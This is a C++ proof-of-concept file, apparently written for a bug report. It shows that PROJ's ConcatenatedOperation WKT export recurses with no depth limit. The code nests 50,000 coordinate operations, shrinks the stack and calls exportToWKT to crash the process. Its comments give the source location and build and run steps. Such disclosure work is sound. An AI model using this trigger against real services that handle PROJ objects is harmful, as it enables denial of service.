// SF01 PoC: Stack overflow via deeply nested ConcatenatedOperation in WKT export
//
// Bug: ConcatenatedOperation::_exportToWKT() in
//      PROJ/src/iso19111/operation/concatenatedoperation.cpp:835
//      recursively calls operation->_exportToWKT(formatter) for each step,
//      without any recursion depth limit.
//
// When a deeply nested ConcatenatedOperation (where each step is itself
// a ConcatenatedOperation) is exported to WKT, this leads to unbounded
// stack recursion and stack overflow (SIGSEGV or ASan stack-overflow).
//
// Affected function:
//   void ConcatenatedOperation::_exportToWKT(io::WKTFormatter *formatter) const
//   File: PROJ/src/iso19111/operation/concatenatedoperation.cpp:796-853
//
// Trigger: Call proj_as_wkt() or exportToWKT() on a deeply nested
//          ConcatenatedOperation object.
//
// Compile:
//   clang++ -std=c++17 -fsanitize=address -g -O1 \
//     -I/src/PROJ/include -I/src/PROJ/src \
//     singleop_SF01_poc.cpp /proj4-build/lib/libproj.a \
//     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm \
//     -o sf01_poc
//
// Run:
//   ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan \
//   ulimit -s 512 && ./sf01_poc
//
// Expected: stack-overflow crash (ASAN: stack-overflow or SIGSEGV)

#include <stdio.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <string>

#include "proj/coordinateoperation.hpp"
#include "proj/coordinatesystem.hpp"
#include "proj/crs.hpp"
#include "proj/datum.hpp"
#include "proj/io.hpp"
#include "proj/metadata.hpp"
#include "proj/util.hpp"
#include "proj/common.hpp"

using namespace osgeo::proj;
using namespace osgeo::proj::operation;
using namespace osgeo::proj::crs;
using namespace osgeo::proj::cs;
using namespace osgeo::proj::datum;
using namespace osgeo::proj::io;
using namespace osgeo::proj::metadata;
using namespace osgeo::proj::util;
using namespace osgeo::proj::common;

static GeographicCRSNNPtr make_wgs84() {
    auto ellipsoid = Ellipsoid::createFlattenedSphere(
        PropertyMap().set(IdentifiedObject::NAME_KEY, "WGS 84"),
        Length(6378137.0, UnitOfMeasure::METRE),
        Scale(298.257223563));
    auto datum_obj = GeodeticReferenceFrame::create(
        PropertyMap().set(IdentifiedObject::NAME_KEY,
                          "World Geodetic System 1984"),
        ellipsoid, optional<std::string>(), PrimeMeridian::GREENWICH);
    auto cs = EllipsoidalCS::createLatitudeLongitude(UnitOfMeasure::DEGREE);
    return GeographicCRS::create(
        PropertyMap()
            .set(IdentifiedObject::NAME_KEY, "WGS 84")
            .set(Identifier::CODESPACE_KEY, "EPSG")
            .set(Identifier::CODE_KEY, 4326),
        datum_obj, cs);
}

static CoordinateOperationNNPtr make_helmert(const GeographicCRSNNPtr &src,
                                              const GeographicCRSNNPtr &dst,
                                              int idx) {
    auto method = OperationMethod::create(
        PropertyMap().set(IdentifiedObject::NAME_KEY,
                          "Geocentric translations (geog2D domain)"),
        std::vector<OperationParameterNNPtr>{
            OperationParameter::create(PropertyMap().set(
                IdentifiedObject::NAME_KEY, "X-axis translation")),
            OperationParameter::create(PropertyMap().set(
                IdentifiedObject::NAME_KEY, "Y-axis translation")),
            OperationParameter::create(PropertyMap().set(
                IdentifiedObject::NAME_KEY, "Z-axis translation")),
        });
    auto params = std::vector<GeneralParameterValueNNPtr>{
        OperationParameterValue::create(
            OperationParameter::create(PropertyMap().set(
                IdentifiedObject::NAME_KEY, "X-axis translation")),
            ParameterValue::create(Measure(0.0, UnitOfMeasure::METRE))),
        OperationParameterValue::create(
            OperationParameter::create(PropertyMap().set(
                IdentifiedObject::NAME_KEY, "Y-axis translation")),
            ParameterValue::create(Measure(0.0, UnitOfMeasure::METRE))),
        OperationParameterValue::create(
            OperationParameter::create(PropertyMap().set(
                IdentifiedObject::NAME_KEY, "Z-axis translation")),
            ParameterValue::create(Measure(0.0, UnitOfMeasure::METRE))),
    };
    return Transformation::create(
        PropertyMap().set(IdentifiedObject::NAME_KEY,
                          std::string("Helmert_") + std::to_string(idx)),
        src, dst, nullptr, method, params,
        std::vector<PositionalAccuracyNNPtr>{});
}

int main(int argc, char *argv[]) {
    // Reduce stack size to 512KB to make the overflow happen with less nesting
    struct rlimit rl;
    getrlimit(RLIMIT_STACK, &rl);
    rl.rlim_cur = 512 * 1024; // 512KB
    setrlimit(RLIMIT_STACK, &rl);

    int depth = 50000; // 50,000 nesting levels
    if (argc > 1) depth = atoi(argv[1]);

    printf("SF01 PoC: Stack overflow via deeply nested ConcatenatedOperation\n");
    printf("Building %d nesting levels (stack=512KB)...\n", depth);
    fflush(stdout);

    auto wgs84 = make_wgs84();

    // Build leaf: 2-step ConcatenatedOperation
    CoordinateOperationNNPtr step1 = make_helmert(wgs84, wgs84, 0);
    CoordinateOperationNNPtr step2 = make_helmert(wgs84, wgs84, 1);
    CoordinateOperationNNPtr current = ConcatenatedOperation::create(
        PropertyMap().set(IdentifiedObject::NAME_KEY, "level_0"),
        {step1, step2},
        std::vector<PositionalAccuracyNNPtr>{});

    // Build nested structure: each level wraps the previous
    for (int i = 1; i < depth; i++) {
        CoordinateOperationNNPtr extra = make_helmert(wgs84, wgs84, i + 2);
        current = ConcatenatedOperation::create(
            PropertyMap().set(IdentifiedObject::NAME_KEY,
                              std::string("level_") + std::to_string(i)),
            {current, extra},
            std::vector<PositionalAccuracyNNPtr>{});
    }

    printf("Structure built. Now calling exportToWKT()...\n");
    fflush(stdout);

    // This triggers recursive _exportToWKT() calls - stack overflow!
    try {
        auto formatter =
            WKTFormatter::create(WKTFormatter::Convention::WKT2_2019);
        current->exportToWKT(formatter.get()); // <-- crashes here
        printf("WKT exported (length=%zu) - no crash!\n",
               formatter->toString().size());
    } catch (const FormattingException &e) {
        fprintf(stderr, "FormattingException: %s\n", e.what());
    }

    return 0;
}
